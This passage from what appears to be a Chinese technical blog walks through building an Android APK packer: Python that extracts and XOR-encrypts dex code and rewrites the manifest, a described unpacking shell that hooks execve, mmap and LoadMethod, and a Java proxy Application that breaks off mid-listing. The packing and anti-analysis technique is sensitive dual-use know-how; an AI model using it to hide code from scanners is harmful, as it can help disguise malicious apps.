&#39;-file&#39;, dexPath, &#39;-extractCodes&#39;])    # 执行命令    def runCommand(self, args):        # subprocess.run(args)        subprocess.run(args, stdout=subprocess.DEVNULL)  # 仅调用工具,不需要额外输出,重定向stdout到os.devnull        # 参数列表 捕获输出 输出转为字符串        # print(subprocess.run(args,  capture_output=True,text=True).stdout)# AndroidManifest.xml的editor 用于获取和修改标签属性,以及添加标签class ManifestEditor:    def __init__(self, xml_content: bytes):        self.ns = &#123;&#39;android&#39;: &#39;http://schemas.android.com/apk/res/android&#39;&#125;        self.tree = etree.fromstring(xml_content)    # 获取指定标签的android属性值 examples: get_attr(&#39;application&#39;, &#39;name&#39;) get_attr(&#39;activity&#39;, &#39;name&#39;)    def getTagAttribute(self, tag_name: str, attr_name: str):        if tag_name == &#39;manifest&#39;:  # 根标签特殊处理            elem = self.tree            if elem is not None:                return elem.get(f&#39;&#123;attr_name&#125;&#39;)  # 寻找标签的属性        else:            elem = self.tree.find(f&#39;.//&#123;tag_name&#125;&#39;, namespaces=self.ns)            if elem is not None:                return elem.get(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;attr_name&#125;&#39;)  # 根标签之外的属性位于android命名空间下        return None    # 设置指定标签的属性值 example:s et_attr(&#39;application&#39;,&#39;name&#39;,&quot;com.example.ProxyApplication&quot;)    def setTagAttribute(self, tag_name: str, attr_name: str, new_value: str):        if tag_name == &#39;manifest&#39;:  # 根标签特殊处理            elem = self.tree            if elem is not None:                return elem.set(f&#39;&#123;attr_name&#125;&#39;, new_value)  # 设置属性值        else:            elem = self.tree.find(f&#39;.//&#123;tag_name&#125;&#39;, namespaces=self.ns)            if elem is not None:                elem.set(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;attr_name&#125;&#39;, new_value)                return True        return False    # 在指定父标签下添加新子标签 example: add_tag(&#39;application&#39;,&quot;meta-data&quot;,&#123;&#39;name&#39;: &#39;android.permission.CAMERA&#39;,&#39;value&#39;:&#39;hello&#39;&#125;)    def addTagWithAttributes(self, parent_tag: str, new_tag: str, attrs: dict):        if parent_tag == &#39;manifest&#39;:            parent = self.tree            if parent is not None:                new_elem = etree.SubElement(parent, new_tag)                for k, v in attrs.items():  # 支持一次给添加的标签设置多个属性                    new_elem.set(f&#39;&#123;k&#125;&#39;, v)                return True        else:            parent = self.tree.find(f&#39;.//&#123;parent_tag&#125;&#39;, namespaces=self.ns)            if parent is not None:                new_elem = etree.SubElement(parent, new_tag)                for k, v in attrs.items():                    new_elem.set(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;&#123;k&#125;&#39;, v)                return True        return False    # 不以壳manifest为基准操作则用不到该函数,以源apk的manifest为基准自带,无需额外设置    def getMainActivity(self):        activities = self.tree.findall(&#39;.//activity&#39;, namespaces=self.ns)        for activity in activities:            intent_filters = activity.findall(&#39;.//intent-filter&#39;, namespaces=self.ns)            for intent_filter in intent_filters:                action = intent_filter.find(&#39;.//action[@android:name=&quot;android.intent.action.MAIN&quot;]&#39;, namespaces=self.ns)                category = intent_filter.find(&#39;.//category[@android:name=&quot;android.intent.category.LAUNCHER&quot;]&#39;,                                              namespaces=self.ns)                if action is not None and category is not None:                    return activity.get(f&#39;&#123;&#123;&#123;self.ns["android"]&#125;&#125;&#125;name&#39;)        return None    # 获取application标签的name属性值    def getApplicationName(self):        return self.getTagAttribute(&#39;application&#39;, &#39;name&#39;)    # 设置application标签的name属性值    def setApplicationName(self, application: str):        self.setTagAttribute(&#39;application&#39;, &#39;name&#39;, application)    # 添加meta-data标签,并设置name和value属性值    def addMetaData(self, name: str, value: str):        self.addTagWithAttributes(&#39;application&#39;, &#39;meta-data&#39;, &#123;&#39;name&#39;: name, &#39;value&#39;: value&#125;)    # 获取AndroidManifest.xml的字符串    def getManifestData(self):        &quot;&quot;&quot;返回XML字符串&quot;&quot;&quot;        return etree.tostring(self.tree, pretty_print=True, encoding=&#39;utf-8&#39;, xml_declaration=True).decode()    # 获取application标签的extractNativeLibs属性值    def getEtractNativeLibs(self):        return self.getTagAttribute(&#39;application&#39;, &#39;extractNativeLibs&#39;)    # 设置application标签的extractNativeLibs属性值为true    def resetExtractNativeLibs(self):        self.setTagAttribute(&#39;application&#39;, &#39;extractNativeLibs&#39;, &#39;true&#39;)# 工具函数,注意修复时顺序为: fileSize-&gt;signature-&gt;checksum# 修复dex文件的checksumdef fixCheckSum(dexBytes: bytearray):    # dexfile[8:12] 小端序4字节    value = adler32(bytes(dexBytes[12:]))    valueArray = bytearray(value.to_bytes(4, &#39;little&#39;))    for i in range(len(valueArray)):        dexBytes[8 + i] = valueArray[i]# 修复dex文件的signaturedef fixSignature(dexBytes: bytearray):    # dexfile[12:32] 小端序20字节    sha_1 = sha1()    sha_1.update(bytes(dexBytes[32:]))    value = sha_1.hexdigest()    valueArray = bytearray(unhexlify(value))    for i in range(len(valueArray)):        dexBytes[12 + i] = valueArray[i]# 修复dex文件的filesizedef fixFileSize(dexBytes: bytearray, fileSize):    # dexfile[32:36] 小端存储    fileSizeArray = bytearray(fileSize.to_bytes(4, &quot;little&quot;))    for i in range(len(fileSizeArray)):        dexBytes[32 + i] = fileSizeArray[i]# 加密函数,使用异或def encrypt(data: bytearray):    # todo:使用aes/sm4等加密算法替代    for i in range(len(data)):        data[i] ^= 0xff    return data# 抽取指定目录下的所有dex文件的代码 patch所有dex文件并修复,将codes文件移动到assets目录下def extractAllDexFiles(directory: Path):    apktool = Apktool()    # 1.遍历目录下的所有dex文件,并抽取对应代码    for dex in directory.glob(&#39;classes*.dex&#39;):        apktool.extractDexCodes(dex)  # 抽取dex文件代码 得到classes*.dex.patched和classes*.dex.codes    # 2.修复抽取后的文件并覆写原dex文件    for patchedDex in directory.glob(&#39;classes*.dex.patched&#39;):        newDexName = str(patchedDex).replace(&#39;.patched&#39;, &#39;&#39;)  # 重命名        # 读取文件内容        with open(patchedDex, &#39;rb&#39;) as f:            data = bytearray(f.read())            # 修复signature和checksum,注意先后顺序            fixSignature(data)            fixCheckSum(data)            # 修复后的文件覆写原dex文件            with open(newDexName, &#39;wb&#39;) as newf:                newf.write(data)    # 3.删除patched文件    for patchedDex in directory.glob(&#39;classes*.dex.patched&#39;):        patchedDex.unlink()    # 4.移动.codes文件到assets目录下    # 如果没有assets目录则创建    if not (directory / &#39;assets&#39;).exists():        (directory / &#39;assets&#39;).mkdir(parents=True)    for codes in directory.glob(&#39;classes*.dex.codes&#39;):        shutil.move(codes, directory / &#39;assets&#39; / codes.name)  # 移动到assets目录下# 合并壳dex和源apk的dex,支持多dex文件,合并为一个dexdef combineShellAndSourceDexs(shellApkTempDir: Path, srcApkTempDir: Path, newApkTempDir: Path):    # 读取解包后的apk的所有dex文件,并合并为一个dex文件    def readAndCombineDexs(unpackedApkDir: Path):        combinedDex = bytearray()        # glob方法返回包含所有匹配文件的生成器        for dex in unpackedApkDir.glob(&#39;classes*.dex&#39;):            print(&#39;Source Apk Dex file:&#39;, dex)            with open(dex, &#39;rb&#39;) as f:                data = bytearray(f.read())                combinedDex += bytearray(len(data).to_bytes(4, &#39;little&#39;))  # dex文件的长度,小端序                combinedDex += data  # dex文件内容        return combinedDex    # 获取shelldex    with open(shellApkTempDir / &#39;classes.dex&#39;, &#39;rb&#39;) as f:        shellDexArray = bytearray(f.read())    # 获取源apk的dex文件    srcDexArray = readAndCombineDexs(srcApkTempDir)    # 新的dex文件长度    newDexLen = len(srcDexArray) + len(shellDexArray) + 4    # 加密源文件    encSrcDexArray = encrypt(srcDexArray)    # 新的dex文件内容 = 壳dex + 加密的源dex + 四字节标识加密后源dex大小长度    newDexArray = shellDexArray + encSrcDexArray + bytearray(len(encSrcDexArray).to_bytes(4, &#39;little&#39;))    # 修改filesize    fixFileSize(newDexArray, newDexLen)    # 修改signature    fixSignature(newDexArray)    # 修改checksum    fixCheckSum(newDexArray)  # 注意先后顺序,先修改signature,再修改checksum    # 导出文件    with open(newApkTempDir / &#39;classes.dex&#39;, &#39;wb&#39;) as f:        f.write(newDexArray)# 提取源apk的Manifest文件,修改application为壳application(可能添加meta-data标签),输出新的Manifest文件def handleManifest(srcApkTempDir: Path, shellApkTempDir: Path, newApkTempDir: Path):    # 从源apk提取AndroidManifest.xml    with open(srcApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;r&#39;) as f:        srcManifestEditor = ManifestEditor(f.read().encode())    srcApplication = srcManifestEditor.getApplicationName()  # 获取application:name,确定是否存在自定义Application类    srcExtractNativeLibs = srcManifestEditor.getEtractNativeLibs()  # 获取application:extractNativeLibs,判断是否释放lib文件    print(&#39;SourceApplication:&#39;, srcApplication)    print(&#39;SourceExtractNativeLibs:&#39;, srcExtractNativeLibs)    # 从壳apk提取AndroidManifest.xml    with open(shellApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;r&#39;) as f:        shellManifestEditor = ManifestEditor(f.read().encode())    print(&#39;ShellApplication:&#39;, shellManifestEditor.getApplicationName())    # 修改源AndroidManifest.xml的application为壳的代理application    srcManifestEditor.setApplicationName(shellManifestEditor.getApplicationName())    # 写入meta-data标签 保存源apk的原始application    if srcApplication != None:        print(&#39;Source application:&#39;, srcApplication)        srcManifestEditor.addMetaData(&#39;APPLICATION_CLASS_NAME&#39;, srcApplication)    # 如果源apk的manifest中默认设置etractNativeLibs=false,则重置为true,确保释放lib文件    if srcExtractNativeLibs == &#39;false&#39;:        srcManifestEditor.resetExtractNativeLibs()    # 输出新的AndroidManifest.xml    with open(newApkTempDir / &#39;AndroidManifest.xml&#39;, &#39;w&#39;) as f:        f.write(srcManifestEditor.getManifestData())# 执行加固流程def start(paths: Paths):    apktool = Apktool()    # 1.分别解包源文件和壳文件到临时目录    print(&#39;Extracting source and shell apk...&#39;)    apktool.unpackApk(paths.srcApkPath, paths.srcApkTempDir)    print(&#39;Extract source apk success!&#39;)    print(&#39;Extracting shell apk...&#39;)    apktool.unpackApk(paths.shellApkPath, paths.shellApkTempDir)    print(&#39;Extract shell apk success!&#39;)    # 2.抽取源dex文件代码    print(&#39;Exrtracting dex files codes...&#39;)    extractAllDexFiles(paths.srcApkTempDir)    print(&#39;Extract dex files codes success!&#39;)    # 3.复制源apk所有文件到新apk临时目录中 忽略源dex和manifest文件    print(&#39;Copying source apk files to new apk temp dir...&#39;)    shutil.copytree(paths.srcApkTempDir, paths.newApkTempDir,                    ignore=shutil.ignore_patterns(&#39;AndroidManifest.xml&#39;, &#39;classes*.dex&#39;))    print(&#39;Copy source apk files success!&#39;)    # 4.复制壳apk的lib库文件到新apk临时目录中 （壳的代码回填逻辑在lib中实现）    print(&#39;Copying shell apk lib files to new apk temp dir...&#39;)    shutil.copytree(paths.shellApkTempDir / &#39;lib&#39;, paths.newApkTempDir / &#39;lib&#39;,                    dirs_exist_ok=True)  # dirs_exist_ok=True 如果目标目录已存在,则覆盖    print(&#39;Copy shell apk lib files success!&#39;)    # 5.处理AndroidManifest.xml    print(&#39;Handling AndroidManifest.xml...&#39;)    handleManifest(paths.srcApkTempDir, paths.shellApkTempDir, paths.newApkTempDir)    print(&#39;Handle AndroidManifest.xml success!&#39;)    # 6.合并壳dex和源apk的dex并导出文件    print(&#39;Combining shell dex and source dexs...&#39;)    combineShellAndSourceDexs(paths.shellApkTempDir, paths.srcApkTempDir, paths.newApkTempDir)    print(&#39;Combine shell dex and source dexs success!&#39;)    # 7.重打包apk    print(&#39;Repacking apk...&#39;)    apktool.repackApk(paths.newApkTempDir, paths.newApkPath)    print(&#39;Repack apk success!&#39;)    # 8.签名apk    print(&#39;Signing apk...&#39;)    apktool.signApk(paths.newApkPath)    print(&#39;Resign apk success!&#39;)    # 9.删除临时目录    print(&#39;Deleting temp directories...&#39;)    shutil.rmtree(paths.tmpdir)    print(&#39;Delete temp directories success!&#39;)def main():    parser = argparse.ArgumentParser(description=&quot;Android APK Packer&quot;)    parser.add_argument(&#39;-src&#39;, &#39;--src-apk&#39;, required=True, type=Path, help=&#39;Path to source APK file&#39;)    parser.add_argument(&#39;-shell&#39;, &#39;--shell-apk&#39;, required=True, type=Path, help=&#39;Path to shell APK file&#39;)    parser.add_argument(&#39;-o&#39;, &#39;-out&#39;, &#39;--output-apk&#39;, type=Path,                        help=&#39;Output path for packed APK (Default: ./out/&lt;src-apk&gt;_protected.apk)&#39;)    args = parser.parse_args()    if args.output_apk == None:        args.output_apk = Path(&#39;./out&#39;) / (args.src_apk.stem + &#39;_protected.apk&#39;)  # 默认新apk名称及输出路径    paths = Paths(args.src_apk, args.shell_apk, args.output_apk)    print(&#39;Source APK:&#39;, paths.srcApkPath)    print(&#39;Shell APK:&#39;, paths.shellApkPath)    print(&#39;Output APK:&#39;, paths.newApkPath)    start(paths)if __name__ == &quot;__main__&quot;:    main()</code></pre><hr><h5 id="脱壳程序-2"><a href="#脱壳程序-2" class="headerlink" title="脱壳程序"></a>脱壳程序</h5><p>脱壳程序主要分为 2 个模块：</p><ol><li>Java 层：提供环境初始化、替换 <strong>ClassLoader</strong>、替换 <strong>Application</strong> 的功能；</li><li>Native 层：提供禁用 <strong>Dex2Oat</strong>、设置 Dex 文件可写、代码回填、代码文件解析的功能。</li></ol><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821163913301.png" alt="image-20250821163913301"></p><p>​        经过前文加壳程序的处理后，源程序 <strong>AndroidManifest.xml</strong> 文件的 <strong>application</strong> 标签的 name 属性指定壳的 application，由于 application 是 Android 应用程序真正的入口类，所以启动加壳后的程序时控制权在壳的代理 application 中。</p><p>​        在壳的代理 application 中主要执行以下操作：</p><ol><li>初始化操作<ul><li>设置相关文件路径，解析相关文件用于后续处理</li></ul></li><li>替换 ClassLoader<ul><li>替换壳程序的 ClassLoader 为被保护程序的 ClassLoader</li></ul></li><li>替换 application<ul><li>若被保护程序存在自定义 application，则创建实例并替换</li></ul></li><li>加载壳 so<ul><li>调用 System.loadLiabray() 主动加载即可，后续在 Native 层执行代码回填</li></ul></li></ol><p>示意图如下：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821164406781.png" alt="image-20250821164406781"></p><hr><h6 id="环境初始化"><a href="#环境初始化" class="headerlink" title="环境初始化"></a>环境初始化</h6><p>主要执行以下操作：</p><ol><li>设置相关私有目录，供后续释放文件以及设置 <strong>DexClassLoader</strong>；</li><li>从壳 APK 文件提取并解析被保护的 dex 文件，写入私有目录<ul><li>调用 <strong>readDexFromApk</strong> 从当前 APK 文件中提取 classs.dex，再调用 <strong>extractDexFilesFromShellDex</strong> 从中提取并分离源程序 Dex 文件，最后调用 <strong>writeByteBuffersToDirectory</strong> 将多个 Dex 文件依次写入私有目录；</li></ul></li><li>从 assets 目录提取 codes 文件写入私有目录<ul><li>调用 <strong>copyClassesCodesFiles</strong> 执行该操作；</li></ul></li><li>拼接源程序所有的 dex 文件的路径<ul><li>用 “:” 分隔，拼接源程序所有 dex 文件路径，供后续 <strong>DexClassLoader</strong> 加载使用。</li></ul></li></ol><p>示意图如下：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821164948347.png" alt="image-20250821164948347"></p><hr><h6 id="替换-ClassLoader"><a href="#替换-ClassLoader" class="headerlink" title="替换 ClassLoader"></a>替换 ClassLoader</h6><p>主要执行以下操作：</p><ol><li>获取当前 ClassLoader<ul><li>调用 this.getClassLoader() 获取；</li></ul></li><li>反射获取 ActivityThread 实例<ul><li>通过反射直接获取 ActivityThread.sCurrentActivityThread 字段，即当前程序对应的 ActivityThread 实例；</li></ul></li><li>反射获取 LoadedApk 实例<ul><li>首先反射获取ActivityThread.mPackages 字段</li><li>再根据当前程序的包名，从中查找获取对应的 LoadedApk 实例；</li></ul></li><li>创建并替换 ClassLoader<ul><li>将环境初始化工作中创建的 lib 和 dex 文件的私有目录路径以及当前 ClassLoader 作为参数，新建 DexClassLoader，该 ClassLoader 可用于加载之前释放的源程序 Dex 文件和 libso 文件。</li></ul></li><li>最后通过反射修改 <strong>LoadedApk.mClassLoader</strong> 实例完整修改。</li></ol><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821170928572.png" alt="image-20250821170928572"></p><hr><h6 id="替换-application"><a href="#替换-application" class="headerlink" title="替换 application"></a>替换 application</h6><p>主要执行以下操作：</p><ol><li>获取自定义 application 完整类名<ul><li>同上文，加壳程序为 AndroidManifest.xml 添加 meta-data 标签，其中保存了源程序自定义的 Application类名；</li></ul></li><li>反射获取 ActivityThread 实例，同上；</li><li>反射获取 LoadedApk 实例，并设置 mApplication 为空；<ul><li>获取 LoadedApk 实例也同上，设置 mApplication 为空的原因是调用 <strong>LoadedApk.makeApplication</strong> 时，如果 mApplication 不为空，则直接返回当前的 Application实例，所以想要替换 Application必须先置空再创建；</li></ul></li><li>获取 <strong>ActivityThread.mInitialApplication</strong> 并删除壳 Application；</li><li>反射调用 <strong>LoadedApk.makeApplication</strong> 创建源 Application；</li><li>重置 <strong>ActivityThread.mInitialApplication</strong> 为源 Application；</li><li>处理 <strong>ContentProvider</strong> 持有的代理 Application；</li><li><strong>调用 Application.onCreate()</strong>，源程序，启动！</li></ol><p>流程图如下：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821172208017.png" alt="image-20250821172208017"></p><hr><h6 id="Native-层"><a href="#Native-层" class="headerlink" title="Native 层"></a>Native 层</h6><p>​        调用 System.loadLibrary 主动加载了壳的 so 文件，首先调用 <strong>init</strong> 函数，其中依次执行以下 Hook 操作（劫持对应函数）：</p><ol><li>Hook execve<ul><li>在 Hook 后添加判断逻辑，匹配到调用 dex2oat 系统调用时直接返回（dex2oat 是 ART 将所有 Dex 文件优化为一个 OAT 文件(本质为 ELF 文件)操作，目的是加快指令执行速度，但这会影响加固工具执行指令回填）；</li></ul></li><li>Hook mmap<ul><li>在 mmap 映射内存时添加写权限，保证可以修改 DexFile 进行指令回填；</li></ul></li><li>Hook LoadMethod<ul><li>LoadMethod 有两个关键参数：<code>DexFile* dexFile</code> 和 <code>Method* method1</code>；</li><li>通过 <strong>dexFile</strong> 获取方法所在的 Dex 文件路径，从而判断是否为源程序被抽取了代码的 Dex 文件，如果是则判断是否进行过文件解析；</li><li>若没有解析过则调用 parseExtractedCodeFiles 函数解析 Dex 文件对应的 codes 文件，这样便成功创建了一组 CodeMap（保存 codeOff 和 CodeItem 映射）；</li><li>之后调用目标方法时，根据 Method.codeOff 从 CodeMap 中提取对应的 CodeItem 并执行指令回填，<strong>dexFile.begin + Method.codeOff</strong> 即为 <strong>insns[]</strong> 指令字节数组的位置。</li></ul></li></ol><p>其中 Hook 主要使用 <strong>BHook</strong> 和 <strong>Dobby</strong></p><ol><li><p>Dobby</p><ul><li><p>参考 <a href="https://github.com/luoyesiqiu/dpt-shell/blob/main/shell/src/main/cpp/CMakeLists.txt">https://github.com/luoyesiqiu/dpt-shell/blob/main/shell/src/main/cpp/CMakeLists.txt</a> 和 <a href="https://www.52pojie.cn/thread-1779984-1-1.html">https://www.52pojie.cn/thread-1779984-1-1.html</a></p></li><li><p>源码编译似乎有点麻烦，静态导入 <strong>Dobby</strong><br>下面是完整的 CMakeLists.txt</p><pre><code class="language-ASN.1">cmake_minimum_required(VERSION 3.22.1)project(&quot;androidshell3&quot;)find_package(bytehook REQUIRED CONFIG)include_directories(dobby)add_library(local_dobby STATIC IMPORTED)set_target_properties(local_dobby PROPERTIES        IMPORTED_LOCATION $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/../../../libs/$&#123;ANDROID_ABI&#125;/libdobby.a)add_library($&#123;CMAKE_PROJECT_NAME&#125; SHARED        # List C/C++ source files with relative paths to this CMakeLists.txt.        dex/DexFile.cpp        dex/DexFile.h        dex/CodeItem.h        dex/class_accessor.h        shell.cpp)target_link_libraries($&#123;CMAKE_PROJECT_NAME&#125;        # List libraries link to the target library        android        log        local_dobby        bytehook::bytehook)</code></pre><p>但是当我去 GitHub 上找已编译好的 Dobby 时，发现Android 版本的 release 已经没了，不过好在之前因为公司的一个项目，组长发过一份给我，就直接用了。</p></li></ul></li><li><p>Bhook</p><ul><li><p>参考 </p></li><li><p><a href="https://github.com/bytedance/bhook/blob/main/README.zh-CN.md">https://github.com/bytedance/bhook/blob/main/README.zh-CN.md</a> 添加 Bhook 依赖</p><pre><code class="language-ASN.1">android &#123;    buildFeatures &#123;        prefab true    &#125;&#125; dependencies &#123;    implementation &#39;com.bytedance:bytehook:1.1.1&#39;&#125;</code></pre></li></ul></li></ol><p>Hook 后的 LoadMethod 主要工作如下：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250821175351659.png" alt="image-20250821175351659"></p><hr><h6 id="ThirdProxyApplication-java"><a href="#ThirdProxyApplication-java" class="headerlink" title="ThirdProxyApplication.java"></a>ThirdProxyApplication.java</h6><p>相对 FirstProxyApplication.java 的改动如下：</p><ol><li>System.loadLibrary(“androidshell3”)<ul><li>主动加载壳程序的 so，设置 hook；</li></ul></li><li>writeByteBuffersToDirectory<ul><li>用于将壳 dex 中提取的源 dex 字节数组写为文件；</li></ul></li><li>copyClassesCodesFiles<ul><li>用于将 dex  文件对应的 codes 文件复制到和 dex 相同的私有目录。</li></ul></li></ol><pre><code class="language-Java">package com.example.androidshell3;import android.app.Application;import android.app.Instrumentation;import android.content.Context;import android.content.pm.ApplicationInfo;import android.content.pm.PackageManager;import android.content.res.AssetManager;import android.os.Bundle;import android.util.ArrayMap;import android.util.Log;import java.io.BufferedInputStream;import java.io.BufferedOutputStream;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.lang.ref.WeakReference;import java.nio.ByteBuffer;import java.nio.ByteOrder;import java.util.ArrayList;import java.util.Iterator;import java.util.zip.ZipEntry;import java.util.zip.ZipInputStream;import dalvik.system.DexClassLoader;public class ThirdProxyApplication extends Application &#123;    private final String TAG=&quot;NshIdE&quot;;    private String dexPath;    private String odexPath;    private String libPath;    public void log(String message)&#123;Log.d(TAG,message);&#125;    @Override    protected void attachBaseContext(Context base) &#123;        super.attachBaseContext(base);        log(&quot;ThirdProxyApplication.attachBaseContext is running!&quot;);        System.loadLibrary(&quot;androidshell&quot;);     //主动加载so,设置hook,进行指令回填        log(&quot;Load libandroidshell.so succeed!&quot;);        try &#123;            //初始化相关环境            initEnvironments();            //配置加载源程序的动态环境,即替换mClassLoader            replaceClassLoader();        &#125; catch (Exception e) &#123;            log( Log.getStackTraceString(e));        &#125;    &#125;    @Override    public void onCreate() &#123;        super.onCreate();        log(&quot;ThirdProxyApplication.onCreate is running!&quot;);        if(replaceApplication())            log(&quot;Replace Application succeed!&quot;);    &#125;    private void initEnvironments() throws IOException &#123;        //1.设置相关目录和路径        File dex = getDir(&quot;tmp_dex&quot;, MODE_PRIVATE);     // 私有目录,存放dex文件        //File lib = getDir(&quot;tmp_lib&quot;, MODE_PRIVATE);       // lib可使用默认目录        //libPath = lib.getAbsolutePath();        odexPath = dex.getAbsolutePath();        libPath=this.getApplicationInfo().nativeLibraryDir; //默认lib路径        dexPath =this.getApplicationInfo().sourceDir;   //当前base.apk路径        //2.从当前base.apk读取classes.dex并读取为字节数组        byte[] shellDexData = readDexFromApk();        log(&quot;Get classes.dex from base.apk succeed!&quot;);        //3.从壳dex文件中分离出源dex文件        ByteBuffer[] byteBuffers = extractDexFilesFromShellDex(shellDexData);        //4.将源dex文件依次写入私有目录        writeByteBuffersToDirectory(byteBuffers, odexPath);        //5.将codes文件依次写入私有目录        copyClassesCodesFiles(this, odexPath);        //6.拼接dex目录字符串,设置dex文件路径 DexClassLoader支持传递多个dex文件路径以加载多个dex文件,通过&#39;:&#39;分隔路径        StringBuffer dexFiles=new StringBuffer();        for(File file:dex.listFiles())&#123;            if(file.getName().contains(&quot;.codes&quot;))                continue;            dexFiles.append(file.getAbsolutePath());            dexFiles.append(&quot;:&quot;);        &#125;        dexPath=dexFiles.toString();    &#125;    private void writeByteBuffersToDirectory(ByteBuffer[] byteBuffers, String directoryPath) throws IOException &#123;        // 创建目录对象        File directory = new File(directoryPath);        // 检查目录是否存在,不存在则创建        if (!directory.exists()) &#123;            if (!directory.mkdirs()) &#123;                throw new IOException(&quot;无法创建目录: &quot; + directoryPath);            &#125;        &#125;        // 遍历 ByteBuffer 数组        for (int i = 0; i &lt; byteBuffers.length; i++) &#123;            // 生成文件名            String fileName;            if (i == 0) &#123;                fileName = &quot;classes.dex&quot;;            &#125; else &#123;                fileName = &quot;classes&quot; + (i + 1) + &quot;.dex&quot;;            &#125;            // 构建文件对象            File file = new File(directory, fileName);            // 创建文件输出流            try (FileOutputStream fos = new FileOutputStream(file)) &#123;                // 获取 ByteBuffer 中的字节数组                ByteBuffer buffer = byteBuffers[i];                byte[] bytes = new byte[buffer.remaining()];                buffer.get(bytes);                // 将字节数组写入文件                fos.write(bytes);            &#125;        &#125;    &#125;    private void copyClassesCodesFiles(Context context, String targetDirectoryPath) &#123;        AssetManager assetManager = context.getAssets();        try &#123;            // 获取 assets 目录下的所有文件和文件夹            String[] files = assetManager.list(&quot;&quot;);            if (files != null) &#123;                // 创建目标目录                File targetDirectory = new File(targetDirectoryPath);                if (!targetDirectory.exists()) &#123;                    if (!targetDirectory.mkdirs()) &#123;                        throw new IOException(&quot;无法创建目标目录: &quot; + targetDirectoryPath);                    &#125;                &#125;                for (String fileName : files) &#123;                    // 筛选以 classes 开头且以 .codes 结尾的文件                    if (fileName.startsWith(&quot;classes&quot;) &amp;&amp; fileName.endsWith(&quot;.codes&quot;)) &#123;                        try (InputStream inputStream = assetManager.open(fileName);                             BufferedInputStream bis = new BufferedInputStream(inputStream);                             FileOutputStream fos = new FileOutputStream(new File(targetDirectory, fileName));                             BufferedOutputStream bos = new BufferedOutputStream(fos)) &#123;                            byte[] buffer = new byte[1024];                            int bytesRead;                            while ((bytesRead = bis.read(buffer)) != -1) &#123;                                bos.write(buffer, 0, bytesRead);                            &#125;                        &#125; catch (IOException e) &#123;                            e.printStackTrace();                        &#125;                    &#125;                &#125;            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    // 从壳dex文件中提取源apk的dex并封装为ByteBuffer    private ByteBuffer[] extractDexFilesFromShellDex(byte[] shellDexData) &#123;        int shellDexlength = shellDexData.length;        //开始解析dex文件        byte[] sourceDexsSizeByte = new byte[4];        //读取源dexs的大小        System.arraycopy(shellDexData,shellDexlength - 4, sourceDexsSizeByte,0,4);        //转成bytebuffer,方便4byte转int        ByteBuffer wrap = ByteBuffer.wrap(sourceDexsSizeByte);        //将byte转成int, 加壳时,长度按小端存储        int sourceDexsSizeInt = wrap.order(ByteOrder.LITTLE_ENDIAN).getInt();        Log.d(TAG, &quot;源dex集合的大小: &quot; + sourceDexsSizeInt);        //读取源dexs        byte[] sourceDexsData = new byte[sourceDexsSizeInt];        System.arraycopy(shellDexData,shellDexlength - sourceDexsSizeInt - 4, sourceDexsData, 0, sourceDexsSizeInt);        //解密源dexs        sourceDexsData = decrypt(sourceDexsData);        //更新部分        //从源dexs中分离dex        ArrayList&lt;byte[]&gt; sourceDexList = new ArrayList&lt;&gt;();        int pos = 0;        while(pos &lt; sourceDexsSizeInt)&#123;            //先提取四个字节,描述当前dex的大小            //开始解析dex文件            byte[] singleDexSizeByte = new byte[4];            //读取源dexs的大小            System.arraycopy(sourceDexsData, pos, singleDexSizeByte,0,4);            //转成bytebuffer,方便4byte转int            ByteBuffer singleDexwrap = ByteBuffer.wrap(singleDexSizeByte);            int singleDexSizeInt = singleDexwrap.order(ByteOrder.LITTLE_ENDIAN).getInt();            Log.d(TAG, &quot;当前Dex的大小: &quot; + singleDexSizeInt);            //读取单独dex            byte[] singleDexData = new byte[singleDexSizeInt];            System.arraycopy(sourceDexsData,pos + 4, singleDexData, 0, singleDexSizeInt);            //加入到dexlist中            sourceDexList.add(singleDexData);            //更新pos            pos += 4 + singleDexSizeInt;        &#125;        //将dexlist包装成ByteBuffer        int dexNum = sourceDexList.size();        Log.d(TAG, &quot;源dex的数量: &quot; + dexNum);        ByteBuffer[] dexBuffers = new ByteBuffer[dexNum];        for (int i = 0; i &lt; dexNum; i++)&#123;            dexBuffers[i] = ByteBuffer.wrap(sourceDexList.get(i));        &#125;        return dexBuffers;    &#125;    // 从当前程序的apk读取dex文件并存储为字节数组    private byte[] readDexFromApk() throws IOException &#123;        //1.获取当前应用程序的源码路径(apk),一般是data/app目录下,该目录用于存放用户安装的软件        String sourceDir = this.getApplicationInfo().sourceDir;        log(&quot;this.getApplicationInfo().sourceDir: &quot; +sourceDir);        //2.创建相关输入流        FileInputStream fileInputStream = new FileInputStream(sourceDir);        BufferedInputStream bufferedInputStream = new BufferedInputStream(fileInputStream);        ZipInputStream zipInputStream = new ZipInputStream(bufferedInputStream); //用于解析apk文件        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); //用于存放dex文件        //3.遍历apk的所有文件并提取dex文件        ZipEntry zipEntry;        while((zipEntry = zipInputStream.getNextEntry()) != null)&#123; //存在下一个文件            // 将classes.dex文件存储到bytearray中 壳dex和源apk合并后只保留一个dex便于处理            if (zipEntry.getName().equals(&quot;classes.dex&quot;))&#123;                byte[] bytes = new byte[1024];                int num;                while((num = zipInputStream.read(bytes))!=-1)&#123;      //每次读取1024byte,返回读取到的byte数                    byteArrayOutputStream.write(bytes,0, num); //存放到开辟的byteArrayOutputStream中                &#125;            &#125;            zipInputStream.closeEntry(); //关闭当前文件        &#125;        zipInputStream.close();        log(&quot;Read dex from apk succeed!&quot;);        return byteArrayOutputStream.toByteArray(); //将读取到的dex文件以字节数组形式返回    &#125;    // 解密   